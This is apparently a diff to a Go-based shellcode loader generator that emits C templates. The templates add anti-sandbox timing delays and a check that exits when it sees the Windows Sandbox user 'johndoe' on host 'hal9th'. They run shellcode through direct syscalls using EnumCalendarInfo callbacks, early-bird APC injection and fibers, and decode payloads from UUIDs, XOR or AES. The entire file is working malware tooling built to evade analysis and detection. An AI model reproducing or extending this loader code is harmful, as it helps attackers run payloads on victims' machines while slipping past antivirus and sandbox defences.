@@ -5,44 +5,37 @@ package Loader
 //VAVAVM	NtAllocateVirtualMemory
 
 // 反沙箱代码
-// 声明反沙箱函数 判断质数
-var __c__sandbox1 = `
-bool Love(long long n1) {
-	if (n1 <= 1)
-		return false;
-	
-	for (long long i = 2; i * i <= n1; ++i) {
-		if (n1 %% i == 0)
-			return false;
-	}
-	
-	return true;
-}
-`
-
 // 在主函数中调用
-var __c__sandbox2 = `
-	for(int i=0;i<10;i++){
-		Love(1000000000000002493);
-	}
+var __c__sandbox = `
+	Love(1000000000000002493);
+	Love(1000000000000002481);
+	Love(1000000000000002319);
+	Love(1000000000000002271);
+	Love(1000000000000002217);
+	Love(1000000000000002137);
+	Love(1000000000000002097);
+	//Love(1000000000000002049);
+	//Love(1000000000000001953);
+	//Love(1000000000000002481);
+
 `
 
 // 回调函数加载
-var __c__callback = `
+var __c__syscall_callback = `
     DWORD oldProtect;
     VAVAVM(GetCurrentProcess(), &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, 0x04);
+	Love(1000000000000002049);
     VAVPVM(GetCurrentProcess(),&addr, &allocationSize, 0x20, &oldProtect);	
+	Love(1000000000000002049);
     VAVPVM(GetCurrentProcess(),&addr, &allocationSize, 0x40, &oldProtect);	
-	VAVWVM(GetCurrentProcess(), addr, xpp, length, NULL);
+	Love(1000000000000002049);
 	EnumCalendarInfo((CALINFO_ENUMPROC)addr, LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1);
 `
-var __c__earlyBird = `
-    SIZE_T shellSize = num_uuids * sizeof(UUID);
-    LPVOID shellAddress = VirtualAlloc(NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+var __c__syscall__earlyBird = `
+    LPVOID shellAddress = VirtualAlloc(NULL, allocationSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
-
-    memcpy(shellAddress, xpp, shellSize);
-    //WriteProcessMemory(GetCurrentProcess(), shellAddress, buf, shellSize, NULL);
+    memcpy(shellAddress, xpp, allocationSize);
+    //WriteProcessMemory(GetCurrentProcess(), shellAddress, buf, allocationSize, NULL);
 
 
     QueueUserAPC((PAPCFUNC)shellAddress, GetCurrentThread(), NULL);
@@ -57,10 +50,16 @@ var __c__earlyBird = `
 `
 
 // 纤程加载
-var __c__fiber = `
+var __c__syscall__fiber = `
+    DWORD oldProtect;
     PVOID mainFiber = ConvertThreadToFiber(NULL);
-    VAVAVM(GetCurrentProcess(), &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, 0x40);
-    VAVWVM(GetCurrentProcess(), addr, xpp, length, NULL);
+    VAVAVM(GetCurrentProcess(), &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, 0x04);
+	Love(1000000000000002049);
+    VAVPVM(GetCurrentProcess(),&addr, &allocationSize, 0x20, &oldProtect);	
+	Love(1000000000000002049);
+    VAVPVM(GetCurrentProcess(),&addr, &allocationSize, 0x40, &oldProtect);	
+	Love(1000000000000002049);
+	VAVWVM(GetCurrentProcess(), addr, xpp, length, NULL);
 
     PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)addr, NULL);
 
@@ -71,7 +70,7 @@ var __c__fiber = `
 var __c__uuid = `
 	const char* uuids[] = { %s };
 	int num_uuids = sizeof(uuids) / sizeof(uuids[0]); 
-	unsigned char xpp[num_uuids];
+    char* xpp = (char*)malloc(num_uuids * sizeof(UUID));
 
 	if (xpp == NULL) {
 		// 内存分配失败处理
@@ -115,9 +114,43 @@ var __c_xor = `
 REPLACE_STSYSCALL_Framework
 #include <Rpc.h>
 
+#define UNLEN 256
+#define HOSTNAME_LEN 256
+
+BOOL wsb_detect_user_and_hostname()
+{
+    WCHAR wcUser[UNLEN + 1];
+    WCHAR wcHostname[HOSTNAME_LEN + 1];
+    RtlSecureZeroMemory(wcUser, sizeof(wcUser));
+    RtlSecureZeroMemory(wcHostname, sizeof(wcHostname));
+
+    DWORD dwUserLength = (UNLEN + 1);
+    DWORD dwHostnameLength = (HOSTNAME_LEN + 1);
+
+    // 获取当前用户名
+    if (!GetUserNameW(wcUser, &dwUserLength))
+    {
+        return FALSE;
+    }
+
+    // 获取计算机主机名
+    if (GetComputerNameW(wcHostname, &dwHostnameLength))
+    {
+		//转小写
+      	wcslwr(wcUser);
+        wcslwr(wcHostname);
+        // 检查用户名和主机名
+        if (wcscmp(wcUser, L"johndoe") == 0 && wcscmp(wcHostname, L"hal9th") == 0)
+        {
+            return TRUE;
+        }
+    }
+
+    return FALSE;
+}
+
 typedef VOID(NTAPI* myNtTestAlert)(VOID);
 
-REPLACE_ANTI_SANDBOX1
 
 char url1[] = "https://www.google.com/search?q=";
 char url3[] = "https://www.bing.com/search?q=";
@@ -138,9 +171,19 @@ void ShowTime(char* data, size_t data_len, char* key, size_t key_len) {
     }
 }
 
-
+bool Love(long long n1) {
+	if (n1 <= 1)
+		return false;
+	
+	for (long long i = 2; i * i <= n1; ++i) {
+		if (n1 %% i == 0)
+			return false;
+	}
+	
+	return true;
+}
 int main() {
-	REPLACE_ANTI_SANDBOX2
+	REPLACE_ANTI_SANDBOX
 
 	REPLACR_OBFUSCATION
     unsigned char key[] = "%s";
@@ -166,10 +209,49 @@ var __c__aes = `
 #include <stdint.h>
 #include <stdbool.h>
 #include <Windows.h>
+#include <lmcons.h>
+#include <lm.h>
 #include "aes.h"
 REPLACE_STSYSCALL_Framework
 
-REPLACE_ANTI_SANDBOX1
+typedef VOID(NTAPI* myNtTestAlert)(VOID);
+
+#define UNLEN 256
+#define HOSTNAME_LEN 256
+
+BOOL wsb_detect_user_and_hostname()
+{
+    WCHAR wcUser[UNLEN + 1];
+    WCHAR wcHostname[HOSTNAME_LEN + 1];
+    RtlSecureZeroMemory(wcUser, sizeof(wcUser));
+    RtlSecureZeroMemory(wcHostname, sizeof(wcHostname));
+
+    DWORD dwUserLength = (UNLEN + 1);
+    DWORD dwHostnameLength = (HOSTNAME_LEN + 1);
+
+    // 获取当前用户名
+    if (!GetUserNameW(wcUser, &dwUserLength))
+    {
+        return FALSE;
+    }
+
+    // 获取计算机主机名
+    if (GetComputerNameW(wcHostname, &dwHostnameLength))
+    {
+		//转小写
+      	wcslwr(wcUser);
+        wcslwr(wcHostname);
+        // 检查用户名和主机名
+        if (wcscmp(wcUser, L"johndoe") == 0 && wcscmp(wcHostname, L"hal9th") == 0)
+        {
+            return TRUE;
+        }
+    }
+
+    return FALSE;
+}
+
+
 char url1[] = "https://www.google.com/search?q=";
 char url3[] = "https://www.perplexity.ai/search";
 char url2[] = "https://www.wikipedia.org/w/api.php?action=query&format=json&list=search&srsearch=";
@@ -177,10 +259,23 @@ char filePath1[] = "C:/Users/username/Documents/file.txt";
 char filePath2[] = "/home/user/documents/file.txt";
 char json1[] = "{\"name\":\"John\",\"age\":30,\"city\":\"New York\"}";
 char json2[] = "{\"product\":\"Apple iPhone 13\",\"price\":999,\"currency\":\"USD\"}";
-
+bool Love(long long n1) {
+	if (n1 <= 1)
+		return false;
+	
+	for (long long i = 2; i * i <= n1; ++i) {
+		if (n1 %% i == 0)
+			return false;
+	}
+	
+	return true;
+}
 int main() {
-
-	REPLACE_ANTI_SANDBOX2
+	 if (wsb_detect_user_and_hostname())
+    {
+        exit(0);
+    }
+	REPLACE_ANTI_SANDBOX
 
 	REPLACR_OBFUSCATION
     uint8_t Key[] = "%s";
